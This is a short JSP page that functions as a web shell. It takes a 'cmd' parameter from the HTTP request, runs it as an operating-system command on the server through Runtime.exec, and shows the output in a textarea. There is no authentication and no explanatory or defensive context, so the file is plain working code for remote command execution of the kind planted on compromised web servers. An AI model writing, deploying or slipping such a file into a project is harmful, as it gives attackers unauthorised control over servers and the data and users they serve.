<%@ page contentType="text/html; charset=utf-8" %>
<%@ page import="java.io.*" %>

<%
String cmd = request.getParameter("cmd");
String result = "";
String line="";
StringBuffer sbCmd=new StringBuffer("");
String strOS = System.getProperty("os.name").toLowerCase();

if(cmd!=null) 
{
	sbCmd.append(cmd+"\r\n\r\n");	
	try
	{
		String[] strShell=new String[2];
		if(strOS.startsWith("win"))
		{
			strShell[0]="cmd";
			strShell[1]="/c";
		}
		else
		{
			strShell[0]="/bin/sh";	
			strShell[1]="-c";
		}
		String[] strCommand=new String[3];
		strCommand[0]=strShell[0];
		strCommand[1]=strShell[1];
		strCommand[2]=cmd;
		System.out.println(cmd);
		/* Process p=Runtime.getRuntime().exec(strCommand,null,new File(strDir)); */
		Process p=Runtime.getRuntime().exec(cmd);
		BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
		while((line=br.readLine())!=null)
		{
			sbCmd.append(line+"\r\n");		
		}
		 
	}
	catch(Exception e)
	{
		//System.out.println(e.toString());
		sbCmd.append("<font color=\"red\">bad command \"" + cmd + "\"</font>");
	}
}
else
{
	cmd = "set";
}
result=sbCmd.toString().trim();
%>
<TEXTAREA NAME="cqq" ROWS="32" COLS="100%"><%=result%></TEXTAREA>